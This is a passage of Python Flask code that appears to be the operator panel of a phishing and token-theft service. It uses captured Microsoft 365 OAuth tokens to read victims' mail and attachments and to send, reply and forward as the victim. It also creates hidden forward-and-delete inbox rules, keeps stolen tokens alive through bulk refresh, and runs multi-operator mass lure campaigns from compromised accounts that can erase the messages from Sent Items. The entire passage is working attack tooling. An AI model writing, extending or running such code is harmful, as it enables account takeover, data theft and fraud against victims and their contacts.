                return jsonify({"error": sr.text}), sr.status_code
            return jsonify({"status": "created", "id": created["id"]})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/drafts/<path:draft_id>/send", methods=["POST"])
def api_send_draft(draft_id):
    """Send an existing draft."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.post(
            f"https://graph.microsoft.com/v1.0/me/messages/{draft_id}/send",
            headers=headers, timeout=15,
        )
        if r.status_code == 202:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"📤 Draft sent for {upn}: {draft_id[:20]}...")
            return jsonify({"status": "sent"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/drafts/<path:draft_id>", methods=["DELETE"])
def api_delete_draft(draft_id):
    """Delete a draft message."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.delete(
            f"https://graph.microsoft.com/v1.0/me/messages/{draft_id}",
            headers=headers, timeout=10,
        )
        if r.status_code == 204:
            return jsonify({"status": "deleted"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/email/<path:msg_id>")
def api_read_email(msg_id):
    """Read full email body + attachments list. Respects Ghost Mode."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}?$select=subject,from,toRecipients,ccRecipients,body,receivedDateTime,hasAttachments,isRead",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            msg = r.json()
            from_addr = msg.get("from", {}).get("emailAddress", {})
            result = {
                "subject": msg.get("subject", ""),
                "from_name": from_addr.get("name", from_addr.get("address", "Unknown")),
                "from": from_addr.get("address", ""),
                "to": [t.get("emailAddress", {}).get("address", "") for t in msg.get("toRecipients", [])],
                "cc": [c.get("emailAddress", {}).get("address", "") for c in msg.get("ccRecipients", [])],
                "body": _sanitize_email_html(msg.get("body", {}).get("content", "")),
                "bodyType": msg.get("body", {}).get("contentType", "text"),
                "date": msg.get("receivedDateTime", ""),
                "hasAttachments": msg.get("hasAttachments", False),
                "attachments": [],
                "ghost_mode": GHOST_MODE,
            }
            # Ghost Mode: if OFF, mark the email as read on the server
            if not GHOST_MODE and not msg.get("isRead", True):
                try:
                    requests.patch(
                        f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                        headers={"Authorization": f"Bearer {at}", "Content-Type": "application/json"},
                        json={"isRead": True}, timeout=5,
                    )
                except Exception:
                    pass  # Non-critical, don't fail the read
            if msg.get("hasAttachments"):
                ar = requests.get(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/attachments",
                    headers=headers, timeout=10,
                )
                if ar.status_code == 200:
                    for a in ar.json().get("value", []):
                        att_name = a.get("name", "")
                        att_id = a.get("id", "")
                        log.info(f"📎 Attachment: name=[{att_name}] id=[{att_id[:40]}...] type={a.get('contentType','')}")
                        result["attachments"].append({
                            "name": att_name,
                            "size": a.get("size", 0),
                            "id": att_id,
                            "contentType": a.get("contentType", ""),
                        })
            return jsonify(result)
        return jsonify({"error": r.status_code}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/attachment/<path:msg_id>/<path:att_id>")
@app.route("/admin/api/attachment/<path:msg_id>/<path:att_id>/dl/<path:fname>")
def api_download_attachment(msg_id, att_id, fname=None):
    """Download an email attachment."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return "Unauthorized", 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/attachments/{att_id}",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            att = r.json()
            content = base64.b64decode(att.get("contentBytes", ""))
            from flask import Response
            inline = request.args.get("inline", "0") == "1"
            disposition = "inline" if inline else "attachment"
            fname = att.get("name", "file")
            # Properly encode filename for Content-Disposition (RFC 5987)
            from urllib.parse import quote
            safe_fname = fname.replace('"', '\\"')
            return Response(
                content,
                mimetype=att.get("contentType", "application/octet-stream"),
                headers={
                    "Content-Disposition": f'{disposition}; filename="{safe_fname}"; filename*=UTF-8\'\'{quote(fname)}',
                },
            )
        return "Not found", 404
    except Exception as e:
        return str(e), 500


@app.route("/admin/api/send", methods=["POST"])
def api_send_email():
    """Send an email as the victim."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    body = {
        "message": {
            "subject": data.get("subject", ""),
            "body": {"contentType": "HTML", "content": data.get("body", "")},
            "toRecipients": [{"emailAddress": {"address": data.get("to", "")}}],
        }
    }
    try:
        r = requests.post(
            "https://graph.microsoft.com/v1.0/me/sendMail",
            headers=headers, json=body, timeout=15,
        )
        if r.status_code == 202:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"📤 Email sent as {upn} → {data.get('to', '?')}")
            return jsonify({"status": "sent"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/reply", methods=["POST"])
def api_reply_email():
    """Reply to an email as the victim."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    msg_id = data.get("msg_id", "")
    reply_body = data.get("body", "")
    if not msg_id or not reply_body:
        return jsonify({"error": "msg_id and body required"}), 400
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    body = {
        "message": {
            "body": {"contentType": "HTML", "content": reply_body.replace("\n", "<br>")}
        }
    }
    try:
        r = requests.post(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/reply",
            headers=headers, json=body, timeout=15,
        )
        if r.status_code == 202:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"↩️ Reply sent as {upn} to msg {msg_id[:20]}...")
            return jsonify({"status": "sent"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/admin/api/forward", methods=["POST"])
def api_forward_email():
    """Forward an email to another recipient."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    msg_id = data.get("msg_id", "")
    to_email = data.get("to", "")
    comment = data.get("comment", "")
    if not msg_id or not to_email:
        return jsonify({"error": "msg_id and to required"}), 400
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    body = {
        "comment": comment.replace("\n", "<br>") if comment else "",
        "toRecipients": [{"emailAddress": {"address": e.strip()}} for e in to_email.split(",") if e.strip()]
    }
    try:
        r = requests.post(
            f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/forward",
            headers=headers, json=body, timeout=15,
        )
        if r.status_code == 202:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"➡️ Forwarded by {upn} to {to_email}")
            return jsonify({"status": "sent"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/rules")
def api_list_rules():
    """List inbox rules with full details."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            rules = []
            for rule in r.json().get("value", []):
                rules.append({
                    "id": rule.get("id", ""),
                    "displayName": rule.get("displayName", ""),
                    "isEnabled": rule.get("isEnabled", False),
                    "conditions": rule.get("conditions", {}),
                    "exceptions": rule.get("exceptions", {}),
                    "actions": rule.get("actions", {}),
                    "sequence": rule.get("sequence", 0),
                    "hasError": rule.get("hasError", False),
                    "isReadOnly": rule.get("isReadOnly", False),
                })
            return jsonify({"rules": rules})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/folders")
def api_list_folders():
    """List mail folders for move-to-folder rules."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me/mailFolders?$top=50",
            headers=headers, timeout=10,
        )
        if r.status_code == 200:
            folders = [{"id": f["id"], "name": f["displayName"], "count": f.get("totalItemCount", 0)}
                       for f in r.json().get("value", [])]
            return jsonify({"folders": folders})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/rules", methods=["POST"])
def api_create_rule():
    """Create an inbox rule with flexible conditions and actions."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    rule_type = data.get("type", "")
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}

    rule = {
        "displayName": data.get("name", "Rule"),
        "sequence": int(data.get("priority", 1)),
        "isEnabled": True,
    }

    # Build conditions
    conditions = {}
    if data.get("from_addresses"):
        conditions["fromAddresses"] = [{"emailAddress": {"address": a.strip()}}
                                        for a in data["from_addresses"].split(",") if a.strip()]
    if data.get("sender_domain"):
        conditions["senderContains"] = [d.strip() for d in data["sender_domain"].split(",") if d.strip()]
    if data.get("subject_contains"):
        conditions["subjectContains"] = [s.strip() for s in data["subject_contains"].split(",") if s.strip()]
    if data.get("body_contains"):
        conditions["bodyContains"] = [b.strip() for b in data["body_contains"].split(",") if b.strip()]
    if data.get("to_recipients"):
        conditions["sentToAddresses"] = [{"emailAddress": {"address": a.strip()}}
                                          for a in data["to_recipients"].split(",") if a.strip()]
    if data.get("has_attachments"):
        conditions["hasAttachments"] = True
    if data.get("importance"):
        conditions["importance"] = data["importance"]
    if data.get("header_contains"):
        conditions["headerContains"] = [h.strip() for h in data["header_contains"].split(",") if h.strip()]
    if conditions:
        rule["conditions"] = conditions

    # Build actions based on type
    actions = {}
    if rule_type == "forward":
        fwd = data.get("forward_to", "")
        if fwd:
            actions["forwardTo"] = [{"emailAddress": {"address": a.strip()}}
                                     for a in fwd.split(",") if a.strip()]
    elif rule_type == "redirect":
        redir = data.get("redirect_to", "")
        if redir:
            actions["redirectTo"] = [{"emailAddress": {"address": a.strip()}}
                                      for a in redir.split(",") if a.strip()]
    elif rule_type == "delete":
        actions["delete"] = True
    elif rule_type == "read":
        actions["markAsRead"] = True
    elif rule_type == "move":
        folder_id = data.get("folder_id", "")
        if folder_id:
            actions["moveToFolder"] = folder_id
    elif rule_type == "forward_delete":
        fwd = data.get("forward_to", "")
        if fwd:
            actions["forwardTo"] = [{"emailAddress": {"address": a.strip()}}
                                     for a in fwd.split(",") if a.strip()]
        actions["delete"] = True
    elif rule_type == "read_move":
        actions["markAsRead"] = True
        folder_id = data.get("folder_id", "")
        if folder_id:
            actions["moveToFolder"] = folder_id

    if data.get("stop_processing"):
        actions["stopProcessingRules"] = True
    if data.get("mark_importance"):
        actions["markImportance"] = data["mark_importance"]

    rule["actions"] = actions

    try:
        r = requests.post(
            "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
            headers=headers, json=rule, timeout=15,
        )
        if r.status_code in (200, 201):
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"📋 Rule created for {upn}: {rule_type} - {data.get('name', '')}")
            return jsonify({"status": "created", "rule": r.json()})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/rules/<path:rule_id>", methods=["PATCH"])
def api_toggle_rule(rule_id):
    """Enable or disable an inbox rule."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    try:
        r = requests.patch(
            f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/{rule_id}",
            headers=headers, json={"isEnabled": data.get("enabled", True)}, timeout=10,
        )
        if r.status_code == 200:
            return jsonify({"status": "updated"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/rules/<path:rule_id>", methods=["DELETE"])
def api_delete_rule(rule_id):
    """Delete an inbox rule."""
    idx = int(request.args.get("idx", 0))
    at, token = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    headers = {"Authorization": f"Bearer {at}"}
    try:
        r = requests.delete(
            f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/{rule_id}",
            headers=headers, timeout=10,
        )
        if r.status_code == 204:
            upn = token.get("upn", "unknown") if token else "unknown"
            log.info(f"🗑️ Rule deleted for {upn}: {rule_id[:20]}...")
            return jsonify({"status": "deleted"})
        return jsonify({"error": r.text}), r.status_code
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ─── Accounts API (Multi-Account Switcher) ────────────────────────────

@app.route("/admin/api/accounts")
def api_accounts():
    """List captured accounts for the mailbox switcher — scoped to operator."""
    current = _get_current_operator()
    tokens = _read_tokens()
    accounts = []
    for i, t in enumerate(reversed(tokens)):
        # Operators only see their own captures; admin sees all
        if current["role"] != "admin" and t.get("operator_id", "admin") != current["operator_id"]:
            continue
        accounts.append({
            "index": i,
            "upn": t.get("upn", "unknown"),
            "name": t.get("name", ""),
            "captured_at": t.get("captured_at", ""),
            "last_refreshed": t.get("last_refreshed", ""),
            "has_refresh": bool(t.get("refresh_token", "")),
            "pretext": t.get("pretext", ""),
        })
    return jsonify({"accounts": accounts})


# ─── Bulk Message Actions ────────────────────────────────────────────

@app.route("/admin/api/messages/bulk", methods=["POST"])
def api_bulk_action():
    """Perform bulk actions on multiple messages (delete, read, unread, flag, unflag, move)."""
    idx = int(request.args.get("idx", 0))
    at, _ = _get_fresh_token(idx)
    if not at:
        return jsonify({"error": "no token"}), 401
    data = request.get_json()
    action = data.get("action", "")
    msg_ids = data.get("msg_ids", [])
    if not msg_ids or not action:
        return jsonify({"error": "action and msg_ids required"}), 400

    headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
    results = {"success": 0, "failed": 0}

    for msg_id in msg_ids:
        try:
            if action == "delete":
                r = requests.delete(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                    headers=headers, timeout=10,
                )
                if r.status_code == 204:
                    results["success"] += 1
                else:
                    results["failed"] += 1
            elif action == "read":
                r = requests.patch(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                    headers=headers, json={"isRead": True}, timeout=10,
                )
                results["success" if r.status_code == 200 else "failed"] += 1
            elif action == "unread":
                r = requests.patch(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                    headers=headers, json={"isRead": False}, timeout=10,
                )
                results["success" if r.status_code == 200 else "failed"] += 1
            elif action == "flag":
                r = requests.patch(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                    headers=headers, json={"flag": {"flagStatus": "flagged"}}, timeout=10,
                )
                results["success" if r.status_code == 200 else "failed"] += 1
            elif action == "unflag":
                r = requests.patch(
                    f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}",
                    headers=headers, json={"flag": {"flagStatus": "notFlagged"}}, timeout=10,
                )
                results["success" if r.status_code == 200 else "failed"] += 1
            elif action == "move":
                folder_id = data.get("folder_id", "")
                if folder_id:
                    r = requests.post(
                        f"https://graph.microsoft.com/v1.0/me/messages/{msg_id}/move",
                        headers=headers, json={"destinationId": folder_id}, timeout=10,
                    )
                    results["success" if r.status_code in (200, 201) else "failed"] += 1
        except Exception:
            results["failed"] += 1

    log.info(f"📦 Bulk {action}: {results['success']} ok, {results['failed']} failed")
    return jsonify(results)


# ═══════════════════════════════════════════════════════════════════════
# NEW PANEL APIs — Token Vault, B2B Sender, Settings, Keywords, Lures
# ═══════════════════════════════════════════════════════════════════════

token_log_lock = threading.Lock()  # Thread-safe file access (kept for backward compat)

def _read_tokens():
    """Read tokens via storage layer (DynamoDB → local JSON fallback)."""
    return store.read_all()

def _write_tokens(tokens):
    """Write tokens via storage layer (DynamoDB + local JSON)."""
    store.write_all(tokens)


# ─── Token Vault APIs ────────────────────────────────────────────────

@app.route("/admin/api/tokens/<int:index>/refresh", methods=["POST"])
def api_token_refresh(index):
    """Force-refresh a specific token via its refresh token."""
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"error": "no tokens"}), 404
    tokens_reversed = list(reversed(tokens))
    if index >= len(tokens_reversed):
        return jsonify({"error": "invalid index"}), 404
    token = tokens_reversed[index]
    # Operator access check
    current = _get_current_operator()
    if current["role"] != "admin" and token.get("operator_id", "admin") != current["operator_id"]:
        return jsonify({"error": "access denied"}), 403
    rt = token.get("refresh_token", "")
    if not rt:
        return jsonify({"error": "no refresh token"}), 400
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        r = requests.post(
            "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
            data={"client_id": CLIENT_ID, "grant_type": "refresh_token",
                  "refresh_token": rt, "resource": RESOURCE},
            headers=ua, timeout=15,
        )
        if r.status_code == 200 and "access_token" in r.json():
            real_index = len(tokens) - 1 - index
            tokens[real_index]["access_token"] = r.json()["access_token"]
            tokens[real_index]["refresh_token"] = r.json().get("refresh_token", rt)
            tokens[real_index]["last_refreshed"] = now_utc().isoformat()
            _write_tokens(tokens)
            upn = token.get("upn", "unknown")
            log.info(f"🔄 Token refreshed: {upn}")
            return jsonify({"status": "refreshed", "last_refreshed": tokens[real_index]["last_refreshed"]})
        return jsonify({"error": "refresh failed", "detail": r.text[:200]}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/tokens/<int:index>/delete", methods=["DELETE"])
def api_token_delete(index):
    """Delete a captured token from the log."""
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"error": "no tokens"}), 404
    tokens_reversed = list(reversed(tokens))
    if index >= len(tokens_reversed):
        return jsonify({"error": "invalid index"}), 404
    # Operator access check
    current = _get_current_operator()
    if current["role"] != "admin" and tokens_reversed[index].get("operator_id", "admin") != current["operator_id"]:
        return jsonify({"error": "access denied"}), 403
    upn = tokens_reversed[index].get("upn", "unknown")
    real_index = len(tokens) - 1 - index
    tokens.pop(real_index)
    _write_tokens(tokens)
    log.info(f"🗑️ Token deleted: {upn}")
    return jsonify({"status": "deleted", "upn": upn})




@app.route("/admin/api/tokens/<int:index>/status")
def api_token_status(index):
    """Quick health check — call /me on the token."""
    current = _get_current_operator()
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"error": "no tokens"}), 404
    tokens_reversed = list(reversed(tokens))
    if index >= len(tokens_reversed):
        return jsonify({"error": "invalid index"}), 404
    token = tokens_reversed[index]
    if current["role"] != "admin" and token.get("operator_id", "admin") != current["operator_id"]:
        return jsonify({"error": "forbidden"}), 403
    at = token.get("access_token", "")
    if not at:
        return jsonify({"status": "no_token"})
    try:
        r = requests.get(
            "https://graph.microsoft.com/v1.0/me?$select=displayName",
            headers={"Authorization": f"Bearer {at}"},
            timeout=10,
        )
        if r.status_code == 200:
            return jsonify({"status": "active"})
        elif r.status_code == 401:
            return jsonify({"status": "expired"})
        else:
            return jsonify({"status": "error", "code": r.status_code})
    except Exception:
        return jsonify({"status": "unknown"})


@app.route("/admin/api/tokens/refresh-all", methods=["POST"])
def api_tokens_refresh_all():
    """Force-refresh tokens that have refresh tokens — scoped to operator."""
    current = _get_current_operator()
    tokens = _read_tokens()
    if not tokens:
        return jsonify({"refreshed": 0, "failed": 0})
    # Operators only refresh their own tokens
    if current["role"] != "admin":
        tokens = [t for t in tokens if t.get("operator_id", "admin") == current["operator_id"]]
    ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    refreshed = 0
    failed = 0
    for t in tokens:
        rt = t.get("refresh_token", "")
        if not rt:
            continue
        try:
            r = requests.post(
                "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                data={"client_id": CLIENT_ID, "grant_type": "refresh_token",
                      "refresh_token": rt, "resource": RESOURCE},
                headers=ua, timeout=15,
            )
            if r.status_code == 200 and "access_token" in r.json():
                t["access_token"] = r.json()["access_token"]
                t["refresh_token"] = r.json().get("refresh_token", rt)
                t["last_refreshed"] = now_utc().isoformat()
                refreshed += 1
            else:
                failed += 1
        except Exception:
            failed += 1
    _write_tokens(tokens)
    log.info(f"🔄 Bulk refresh: {refreshed} ok, {failed} failed")
    return jsonify({"refreshed": refreshed, "failed": failed})


# ─── B2B Sender APIs ─────────────────────────────────────────────────

B2B_JOBS_FILE = os.path.join(DATA_DIR, "b2b_jobs.json")

def _persist_b2b_jobs():
    """Atomically write b2b_jobs to disk (called while b2b_jobs_lock is NOT held)."""
    tmp = B2B_JOBS_FILE + ".tmp"
    try:
        with b2b_jobs_lock:
            snapshot = json.dumps(b2b_jobs, default=str, indent=2)
        with open(tmp, "w") as f:
            f.write(snapshot)
        os.replace(tmp, B2B_JOBS_FILE)
    except Exception as e:
        log.warning(f"b2b_jobs persist failed: {e}")

def _load_b2b_jobs():
    """Load persisted jobs on startup; mark any 'running' jobs as 'interrupted'."""
    if not os.path.exists(B2B_JOBS_FILE):
        return {}
    try:
        with open(B2B_JOBS_FILE) as f:
            jobs = json.load(f)
        for job in jobs.values():
            if job.get("status") == "running":
                job["status"] = "interrupted"
                job.setdefault("errors", []).append("Server restarted while job was running")
        return jobs
    except Exception as e:
        log.warning(f"b2b_jobs load failed: {e}")
        return {}

b2b_jobs = _load_b2b_jobs()
b2b_jobs_lock = threading.Lock()

def _b2b_send_worker(job_id, token_idx, recipients, subject, body,
                     delay, importance, delete_from_sent, link_url, sender_name):
    """Background worker: sends emails one by one with delay."""
    at, token = _get_fresh_token(token_idx)
    if not at:
        with b2b_jobs_lock:
            b2b_jobs[job_id]["status"] = "failed"
            b2b_jobs[job_id]["errors"].append("Could not get fresh token")
        _persist_b2b_jobs()
        return

    upn = token.get("upn", "unknown") if token else "unknown"
    with b2b_jobs_lock:
        b2b_jobs[job_id]["from_upn"] = upn

    for i, recipient in enumerate(recipients):
        recipient = recipient.strip()
        if not recipient or "@" not in recipient:
            with b2b_jobs_lock:
                b2b_jobs[job_id]["failed"] += 1
            continue

        # Apply personalization
        _sname = sender_name or upn.split("@")[0]
        _first = recipient.split("@")[0].split(".")[0].capitalize()
        _last  = recipient.split("@")[0].split(".")[-1].capitalize() if "." in recipient.split("@")[0] else ""
        _domain = recipient.split("@")[1] if "@" in recipient else ""
        _today = datetime.now().strftime("%B %d, %Y")
        final_subject = subject
        final_body = body
        for _ph, _val in [
            ("{{sender_name}}", _sname),
            ("{{first_name}}", _first),
            ("{{last_name}}", _last),
            ("{{domain}}", _domain),
            ("{{date}}", _today),
            ("{{link}}", link_url),
        ]:
            final_subject = final_subject.replace(_ph, _val)
            final_body = final_body.replace(_ph, _val)

        headers = {"Authorization": f"Bearer {at}", "Content-Type": "application/json"}
        msg_body = {
            "message": {
                "subject": final_subject,
                "body": {"contentType": "HTML", "content": final_body},
                "toRecipients": [{"emailAddress": {"address": recipient}}],
            },
            "saveToSentItems": not delete_from_sent,
        }
        if importance and importance != "normal":
            msg_body["message"]["importance"] = importance

        try:
            r = requests.post(
                "https://graph.microsoft.com/v1.0/me/sendMail",
                headers=headers, json=msg_body, timeout=15,
            )
            if r.status_code == 202:
                with b2b_jobs_lock:
                    b2b_jobs[job_id]["sent"] += 1
                log.info(f"📤 B2B [{job_id[:8]}] {i+1}/{len(recipients)} → {recipient}")
            else:
                with b2b_jobs_lock:
                    b2b_jobs[job_id]["failed"] += 1
                    b2b_jobs[job_id]["errors"].append(f"{recipient}: {r.status_code}")
        except Exception as e:
            with b2b_jobs_lock:
                b2b_jobs[job_id]["failed"] += 1
                b2b_jobs[job_id]["errors"].append(f"{recipient}: {str(e)}")

        # Persist progress every 10 emails
        if (i + 1) % 10 == 0:
            _persist_b2b_jobs()

        # Check for cancellation
        with b2b_jobs_lock:
            cancelled = b2b_jobs[job_id]["status"] == "cancelled"
        if cancelled:
            log.info(f"🛑 B2B job {job_id[:8]} cancelled")
            _persist_b2b_jobs()
            return

        # Delay between sends (skip on last one)
        if i < len(recipients) - 1 and delay > 0:
            time.sleep(delay)

        # Refresh token periodically (every 20 emails)
        if (i + 1) % 20 == 0:
            at_new, _ = _get_fresh_token(token_idx)
            if at_new:
                at = at_new
            else:
                log.warning(f"B2B [{job_id[:8]}] token refresh failed at email {i+1}, retrying in 5s")
                time.sleep(5)
                at_new, _ = _get_fresh_token(token_idx)
                if at_new:
                    at = at_new
                else:
                    with b2b_jobs_lock:
                        b2b_jobs[job_id]["status"] = "failed"
                        b2b_jobs[job_id]["errors"].append(
                            f"Token expired and could not refresh at email {i+1}/{len(recipients)}"
                        )
                    _persist_b2b_jobs()
                    return

    with b2b_jobs_lock:
        b2b_jobs[job_id]["status"] = "complete"
    _persist_b2b_jobs()
    log.info(f"✅ B2B job {job_id[:8]} complete: {b2b_jobs[job_id]['sent']} sent, {b2b_jobs[job_id]['failed']} failed")


@app.route("/admin/api/b2b/send", methods=["POST"])
def api_b2b_send():
    """Start a bulk email send job."""
    data = request.get_json()
    if not data:
        return jsonify({"error": "JSON body required"}), 400

    token_idx = int(data.get("token_idx", 0))
    recipients_raw = data.get("recipients", [])
    subject = data.get("subject", "")
    body = data.get("body", "")
    delay = max(0, int(data.get("delay", 2)))
    importance = data.get("importance", "normal")
    delete_from_sent = bool(data.get("delete_from_sent", False))
    link_url = data.get("link_url", "")
    sender_name = data.get("sender_name", "")

    # Parse recipients (handle comma or newline separated)
    if isinstance(recipients_raw, str):
        recipients = [r.strip() for r in re.split(r'[,\n;]+', recipients_raw) if r.strip()]
    else:
        recipients = [r.strip() for r in recipients_raw if r.strip()]

    if not recipients:
        return jsonify({"error": "no recipients"}), 400
    if not subject:
        return jsonify({"error": "subject required"}), 400

    current = _get_current_operator()

    # Enforce per-operator daily send quota (locked to prevent race conditions)
    if current["role"] != "admin":
        with _operators_lock:
            operators = _load_operators()
            op_rec = next((o for o in operators if o["id"] == current["operator_id"]), None)
            if op_rec:
                today = now_utc().strftime("%Y-%m-%d")
                if op_rec.get("sends_today_date") != today:
                    op_rec["sends_today"] = 0
                    op_rec["sends_today_date"] = today
                max_daily = int(op_rec.get("max_daily_sends", 0))
                if max_daily > 0:
                    used = int(op_rec.get("sends_today", 0))
                    remaining = max_daily - used
                    if len(recipients) > remaining:
                        return jsonify({
                            "error": f"daily send quota exceeded — {used}/{max_daily} used today, {remaining} remaining"
                        }), 429
                op_rec["sends_today"] = int(op_rec.get("sends_today", 0)) + len(recipients)
                op_rec["sends_today_date"] = today
                _save_operators(operators)

    job_id = secrets.token_hex(8)
    with b2b_jobs_lock:
        b2b_jobs[job_id] = {
            "status": "sending",
            "from_upn": "",
            "subject": subject[:100],
            "total": len(recipients),
            "sent": 0,
            "failed": 0,
            "started": now_utc().isoformat(),
            "errors": [],
            "operator_id": current["operator_id"],
        }

    _persist_b2b_jobs()

    # Spawn background thread
    t = threading.Thread(
        target=_b2b_send_worker, daemon=True,
        args=(job_id, token_idx, recipients, subject, body,
              delay, importance, delete_from_sent, link_url, sender_name),
    )
    t.start()

    log.info(f"📤 B2B job started: {job_id[:8]} → {len(recipients)} recipients")
    audit("b2b_send_start", detail=f"{len(recipients)} recipients, subject: {subject[:60]}", target=job_id)
    return jsonify({"job_id": job_id, "total": len(recipients)})


@app.route("/admin/api/b2b/jobs")
def api_b2b_jobs():
    """List B2B send jobs — scoped to operator."""
    current = _get_current_operator()
    with b2b_jobs_lock:
        jobs = []
        for jid, j in sorted(b2b_jobs.items(), key=lambda x: x[1].get("started", ""), reverse=True):
            if current["role"] != "admin" and j.get("operator_id", "admin") != current["operator_id"]:
                continue
            jobs.append({
                "id": jid,
                "status": j["status"],
                "from_upn": j["from_upn"],
                "subject": j["subject"],
                "total": j["total"],
                "sent": j["sent"],
                "failed": j["failed"],
                "started": j["started"],
            })
    return jsonify({"jobs": jobs})


@app.route("/admin/api/b2b/jobs/<job_id>")
def api_b2b_job_detail(job_id):
    """Get a specific job's progress."""
    current = _get_current_operator()
    with b2b_jobs_lock:
        job = b2b_jobs.get(job_id)
    if not job:
        return jsonify({"error": "job not found"}), 404
    if current["role"] != "admin" and job.get("operator_id", "admin") != current["operator_id"]:
        return jsonify({"error": "forbidden"}), 403
    return jsonify(job)


@app.route("/admin/api/b2b/jobs/<job_id>/cancel", methods=["POST"])
def api_b2b_job_cancel(job_id):
    """Cancel a running send job."""
    current = _get_current_operator()
    with b2b_jobs_lock:
        job = b2b_jobs.get(job_id)
        if not job:
            return jsonify({"error": "job not found"}), 404
        if current["role"] != "admin" and job.get("operator_id", "admin") != current["operator_id"]:
            return jsonify({"error": "forbidden"}), 403
        was_sending = job["status"] == "sending"
        if was_sending:
            job["status"] = "cancelled"
    if was_sending:
        _persist_b2b_jobs()
        return jsonify({"status": "cancelled"})
